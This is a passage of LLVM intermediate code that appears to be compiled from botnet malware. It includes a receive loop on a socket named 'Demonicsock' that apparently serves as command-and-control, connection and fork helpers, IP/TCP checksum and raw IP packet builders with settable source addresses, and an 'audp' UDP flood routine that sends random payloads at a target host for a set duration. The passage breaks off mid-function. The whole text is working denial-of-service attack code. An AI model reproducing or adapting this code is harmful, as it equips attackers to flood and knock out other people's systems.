  %87 = load i8*, i8** %6, align 8
  store i8* %87, i8** %17, align 8
  br label %88

; <label>:88:                                     ; preds = %106, %86
  %89 = load i32, i32* %7, align 4
  %90 = add nsw i32 %89, -1
  store i32 %90, i32* %7, align 4
  %91 = icmp sgt i32 %89, 1
  br i1 %91, label %92, label %109

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* @Demonicsock, align 4
  %94 = call i64 @recv(i32 %93, i8* %16, i64 1, i32 0)
  %95 = icmp ne i64 %94, 1
  br i1 %95, label %96, label %98

; <label>:96:                                     ; preds = %92
  %97 = load i8*, i8** %17, align 8
  store i8 0, i8* %97, align 1
  store i32 -1, i32* %4, align 4
  br label %112

; <label>:98:                                     ; preds = %92
  %99 = load i8, i8* %16, align 1
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %17, align 8
  store i8 %99, i8* %100, align 1
  %102 = load i8, i8* %16, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 10
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %98
  br label %109

; <label>:106:                                    ; preds = %98
  %107 = load i32, i32* %18, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %18, align 4
  br label %88

; <label>:109:                                    ; preds = %105, %88
  %110 = load i8*, i8** %17, align 8
  store i8 0, i8* %110, align 1
  %111 = load i32, i32* %18, align 4
  store i32 %111, i32* %4, align 4
  br label %112

; <label>:112:                                    ; preds = %109, %96
  %113 = load i32, i32* %4, align 4
  ret i32 %113
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #9
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #9
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #6, !srcloc !3
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #6
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #6
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #6
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #9
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #6
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #6
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #9
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

; <label>:77:                                     ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @audp(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #9
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %263

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %102

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %57, label %56

; <label>:56:                                     ; preds = %52
  br label %263

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* %11, align 4
  %59 = add nsw i32 %58, 1
  %60 = sext i32 %59 to i64
  %61 = call noalias i8* @malloc(i64 %60) #6
  store i8* %61, i8** %16, align 8
  %62 = load i8*, i8** %16, align 8
  %63 = icmp eq i8* %62, null
  br i1 %63, label %64, label %65

; <label>:64:                                     ; preds = %57
  br label %263

; <label>:65:                                     ; preds = %57
  %66 = load i8*, i8** %16, align 8
  %67 = load i32, i32* %11, align 4
  %68 = add nsw i32 %67, 1
  %69 = sext i32 %68 to i64
  call void @llvm.memset.p0i8.i64(i8* %66, i8 0, i64 %69, i32 1, i1 false)
  %70 = load i8*, i8** %16, align 8
  %71 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %70, i32 %71)
  %72 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %73 = load i32, i32* %9, align 4
  %74 = add nsw i32 %72, %73
  store i32 %74, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %75

; <label>:75:                                     ; preds = %98, %97, %65
  %76 = load i32, i32* %15, align 4
  %77 = load i8*, i8** %16, align 8
  %78 = load i32, i32* %11, align 4
  %79 = sext i32 %78 to i64
  %80 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %81 = call i64 @sendto(i32 %76, i8* %77, i64 %79, i32 0, %struct.sockaddr* %80, i32 16)
  %82 = load i32, i32* %18, align 4
  %83 = load i32, i32* %14, align 4
  %84 = icmp eq i32 %82, %83
  br i1 %84, label %85, label %98

; <label>:85:                                     ; preds = %75
  %86 = load i32, i32* %8, align 4
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %92

; <label>:88:                                     ; preds = %85
  %89 = call i32 @rand_cmwc()
  %90 = trunc i32 %89 to i16
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %90, i16* %91, align 2
  br label %92

; <label>:92:                                     ; preds = %88, %85
  %93 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %94 = load i32, i32* %17, align 4
  %95 = icmp sgt i32 %93, %94
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %92
  br label %101

; <label>:97:                                     ; preds = %92
  store i32 0, i32* %18, align 4
  br label %75

; <label>:98:                                     ; preds = %75
  %99 = load i32, i32* %18, align 4
  %100 = add i32 %99, 1
  store i32 %100, i32* %18, align 4
  br label %75

; <label>:101:                                    ; preds = %96
  br label %263

; <label>:102:                                    ; preds = %46
  %103 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %103, i32* %19, align 4
  %104 = load i32, i32* %19, align 4
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %107, label %106

; <label>:106:                                    ; preds = %102
  br label %263

; <label>:107:                                    ; preds = %102
  store i32 1, i32* %20, align 4
  %108 = load i32, i32* %19, align 4
  %109 = bitcast i32* %20 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp slt i32 %110, 0
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %107
  br label %263

; <label>:113:                                    ; preds = %107
  store i32 50, i32* %21, align 4
  br label %114

; <label>:114:                                    ; preds = %118, %113
  %115 = load i32, i32* %21, align 4
  %116 = add nsw i32 %115, -1
  store i32 %116, i32* %21, align 4
  %117 = icmp ne i32 %115, 0
  br i1 %117, label %118, label %123

; <label>:118:                                    ; preds = %114
  %119 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %120 = call i32 @rand_cmwc()
